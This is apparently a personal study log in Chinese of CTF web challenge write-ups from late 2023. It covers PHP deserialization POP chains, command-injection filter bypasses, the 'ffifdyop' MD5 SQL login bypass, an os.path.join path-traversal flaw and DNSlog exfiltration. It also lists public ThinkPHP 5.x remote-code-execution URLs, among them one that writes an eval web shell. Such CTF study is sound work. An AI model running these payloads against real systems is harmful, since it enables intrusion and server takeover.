---
title: 2023年11-12月比赛学习记录
date: 2023-12-31 00:00:00 +0800
categories: [比赛WP, 学习笔记]
tags: [CTF, WEB, REVERSE]
---

# 杂

 **SWPUCTF 2021 新生赛]nc签到** 

这题提到了nc连接，就是用虚拟机输入 nc node7.anna.nssctf.cn 26969

然后再虚拟机内输入命令就行

![1754277395814](C:\Users\22295\AppData\Roaming\Typora\typora-user-images\1754277395814.png)





 **[SWPUCTF 2021 新生赛]no_wakeup** 

源码

![1754281839481](C:\Users\22295\AppData\Roaming\Typora\typora-user-images\1754281839481.png)

一开始看到`__construct`会覆盖原来参数就想办法饶过它，但是源码中并不会有新建类的代码，只有反序列化的代码，所以__construct不会执行。

只需要考虑绕过__wakeup，在反序列化时它会自动调用

### 关键原理：反序列化不触发构造函数

PHP 中，`__construct` 是对象**被创建时**（例如用`new`关键字实例化）自动调用的初始化方法，而**反序列化（`unserialize`）过程不会执行`__construct`**。



也就是说：



- 当你用`new HaHaHa()`创建对象时，`__construct`会被调用，将`$admin`设为`"user"`，`$passwd`设为`"123456"`。
- 但当你反序列化一个字符串生成对象时，PHP 会直接根据序列化字符串中的数据还原对象属性，**完全跳过`__construct`**，不会覆盖你在序列化字符串中设置的`$admin`和`$passwd`。



 **[LitCTF 2023]Ping** 

![1754364337968](C:\Users\22295\AppData\Roaming\Typora\typora-user-images\1754364337968.png)

过滤在代码在前端，用burp可以直接无视过滤绕过



 **[BJDCTF 2020]easy_md5** 

![1754368595068](C:\Users\22295\AppData\Roaming\Typora\typora-user-images\1754368595068.png)

查看文件的响应头发现关键语句: select * from 'admin' where password=md5($pass,true)

```
 原理：
ffifdyop的MD5加密结果是276f722736c95d99e921722cf9ed621c，经过MySQL编码后会变成’or’6xxx,相当于select * from 'admin' where password=''or 1，使SQL恒成立,相当于万能密码,可以绕过md5()函数的加密。关键参数为md5(xx,true)。 
```

##### 1. 函数作用

- `MD5()` 是 MySQL 中用于计算字符串 MD5 消息摘要的函数，通常用于对密码等敏感信息进行哈希处理（非加密，不可逆）。

- 第二个参数

   

  ```
  true
  ```

   

  是可选参数，决定返回结果的格式：

  - 不填或填 `false`（默认）：返回 **32 位十六进制字符串**（如 `d41d8cd98f00b204e9800998ecf8427e`，对应空字符串的 MD5）。
  - 填 `true`：返回 **原始二进制格式** 的哈希值（长度为 16 字节的二进制数据，非可读字符串）。

##### 2. 二进制格式的特殊性

原始二进制格式的 MD5 结果本身不是人类可读的字符串，但在 MySQL 中，当二进制数据被用于字符串上下文（如拼接 SQL 语句）时，会被自动转换为对应的字符编码（如 Latin1）。



- 这种转换可能导致二进制数据被解析为特殊字符（如单引号 `'`、逻辑运算符 `or` 等），这也是之前提到的 “`ffifdyop` 万能密码” 漏洞的核心原因 —— 其二进制 MD5 结果被解析为 `'or'6...`，篡改了 SQL 逻辑。



 [GXYCTF 2019]Ping Ping Ping 

```
 else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){ 		
        die("fxck your flag!"); 
```

a=ag;b=fl $b$a可以绕过

或者

?ip=127.0.0.1;a=f;cat$IFS$1$alag.php 



 **[SWPUCTF 2021 新生赛]finalrce** 

![1754464549254](C:\Users\22295\AppData\Roaming\Typora\typora-user-images\1754464549254.png)



-和nc等监听都被过滤了，尝试用dnslog外带

操做方法，用ceye平台，登入后复制

![1754464593814](C:\Users\22295\AppData\Roaming\Typora\typora-user-images\1754464593814.png)



在题目传入数据

![1754464617819](C:\Users\22295\AppData\Roaming\Typora\typora-user-images\1754464617819.png)

然后就可以rce了，在``中输入命令，例如ls等

在ceye平台能看到回显





 **[NISACTF 2022]babyupload （一道python漏洞题）**

![1754637141704](C:\Users\22295\AppData\Roaming\Typora\typora-user-images\1754637141704.png)



起初是文件上传界面

但是发现怎么上传也没有用，f12发现了线索/source

访问自动下载了python源码

```
from flask import Flask, request, redirect, g, send_from_directory
import sqlite3
import os
import uuid  # 通用唯一识别码(Universally Unique Identifier)，标准格式为xxxxxxxx-xxxx-xxxx-xxxxxxxxxxxx

app = Flask(__name__)

SCHEMA = """CREATE TABLE files (
id text primary key,
path text
);
"""


def db():
    g_db = getattr(g, '_database', None)
    if g_db is None:
        g_db = g._database = sqlite3.connect("database.db")
    return g_db


@app.before_first_request
def setup():  # 建立数据库连接
    os.remove("database.db")
    cur = db().cursor()
    cur.executescript(SCHEMA)


@app.route('/')
def hello_world():
    return """<!DOCTYPE html>
<html>
<body>
<form action="/upload" method="post" enctype="multipart/form-data">
    Select image to upload:
    <input type="file" name="file">
    <input type="submit" value="Upload File" name="submit">
</form>
<!-- /source -->
</body>
</html>"""


@app.route('/source')
def source():
    return send_from_directory(directory="/var/www/html/", path="www.zip", as_attachment=True)


@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return redirect('/')
    file = request.files['file']
    if "." in file.filename:  # 检查上传的文件名是否含有点号，即过滤了后缀名
        return "Bad filename!", 403
    conn = db()
    cur = conn.cursor()
    uid = uuid.uuid4().hex  # 生成文件的uuid
    try:  # 检查文件是否重复
        cur.execute("insert into files (id, path) values (?, ?)", (uid, file.filename,))
    except sqlite3.IntegrityError:
        return "Duplicate file"
    conn.commit()

    file.save('uploads/' + file.filename)  # 保存文件在uploads/下
    return redirect('/file/' + uid)  # 返回文件的uuid


@app.route('/file/<id>')
def file(id):  # 访问文件
    conn = db()
    cur = conn.cursor()
    cur.execute("select path from files where id=?", (id,))  # 根据文件uuid，在数据库中查询文件名
    res = cur.fetchone()  # 将数据库查询结果返回
    if res is None:
        return "File not found", 404

    # print(res[0])

    with open(os.path.join("uploads/", res[0]), "r") as f:  # 将查询到的文件名与uploads/拼接
        return f.read()


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

分析后：综上，后端代码的逻辑如下：上传的文件不能有后缀名，上传后生成一个uuid，并将uuid和文件名存入数据库中，并返回文件的uuid。再通过`/file/uuid`访问文件，通过查询数据库得到对应文件名，在文件名前拼接`uploads/`后读取该路径下上传的文件。



两个点：

1.

UUID 是 Universally Unique Identifier（通用唯一识别码）的缩写，是一种用于在计算机系统中唯一标识信息的标准化格式。

在你提供的这段 Flask 代码中，UUID 被用来为每个上传的文件生成一个唯一标识符

2.

绝对路径拼接漏洞

os.path.join(path,*paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。

然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 / 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径
例子：

```python
import os

# 基础路径（预期为相对路径或指定目录）
base_dir = "/uploads/"

# 正常情况：拼接相对路径片段
safe_path = os.path.join(base_dir, "user123", "file.txt")
print(safe_path)  # 输出：/uploads/user123/file.txt（符合预期）

# 危险情况：拼接的片段以 / 开头（绝对路径）
malicious_path = os.path.join(base_dir, "/etc/passwd")
print(malicious_path)  # 输出：/etc/passwd（覆盖了基础路径！）
```



所以题解：

传入filename=/flag

利用漏洞直接访问根目录下的/flag

访问方式不是uploads/xxx是file/uuid

![1754638361543](C:\Users\22295\AppData\Roaming\Typora\typora-user-images\1754638361543.png)

![1754638375926](C:\Users\22295\AppData\Roaming\Typora\typora-user-images\1754638375926.png)

访问这串就能得到flag



[NISACTF 2022]

   public function __call($fun1,$arg){
    $this->huang->fun=$arg[0];
  } 

  public function __set($name, $value)
  { 

当call魔术触发时，将进行赋值就能触发set魔术

然后这里要注意的是形参$name和$value分别对应上一步被复制的实参和值

就是$fun和$arg[0]



 **[SWPUCTF 2022 新生赛]ez_rce** 

是经典thinkphp v5.0漏洞

可以在网上找poc（ 概念验证代码 ）

```
5.0.x 版本：
?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
?s=index/\think\app/invokefunction&function=phpinfo&vars[0]=100
?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=内容用URL编码

5.1版本：
?s=index/think\request/input?data[]=phpinfo()&filter=assert
?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
?s=index/\think\template\driver\file/write?cacheFile=shell.php&content=<?php%20phpinfo();?>
?s=index/\think\template\driver\file/write
&cacheFile=aaa.php&content=<?php @eval($_POST['cmd']);?>
```





 [NISACTF 2022]popchains 

```
<?php

class Road_is_Long{

  public $page;

  public $string;

  public function __construct($file='index.php'){

​    $this->page = $file;

  }

  public function __toString(){

​    return $this->string->page;

  }



  public function __wakeup(){

​    if(preg_match("/file|ftp|http|https|gopher|dict|\.\./i", $this->page)) {

​      echo "You can Not Enter 2022";

​      $this->page = "index.php";

​    }

  }

}



class Try_Work_Hard{

  protected  $var;

  public function append($value){

​    include($value);

  }

  public function __invoke(){

​    $this->append($this->var);

  }

}



class Make_a_Change{

  public $effort;

  public function __construct(){

​    $this->effort = array();

  }



  public function __get($key){

​    $function = $this->effort;

​    return $function();

  }

}
```

这道题主要要注意__get魔术的调用，调用形式是

 public function __toString(){

    return $this->string->page;

  }

这行代码。

（当访问一个类中不存在的对象时触发__get的魔术方法）

那我们就可以将string 设置为__get所在的类，即Make_a_Change，然后改类下没有page这个对象，就自动触发了\_\_get



这里对这道题在处理一遍：

首先观察代码，发现关键函数include()，想办法利用它；

一步一步反推，需要触发invoke（当所处类被当函数调用时自动触发），然后看到get魔术方法里可以调用函数，想办法触发get，（要求是调用当前类中没有的对象）。

所以大致pop链：

```plaintext
unserialize() → Road_is_Long::__wakeup() 
→ Road_is_Long::__toString() 
→ Make_a_Change::__get() 
→ Try_Work_Hard::__invoke() 
→ Try_Work_Hard::append() 
→ include(恶意文件)
```

payload:

$a=new Road_is_Long();

$b=new Make_a_Change();

$c=new Try_Work_Hard();

$a->page=$a;

$a->string=$b;

$b->effort=$c;


echo urlencode(serialize($a));
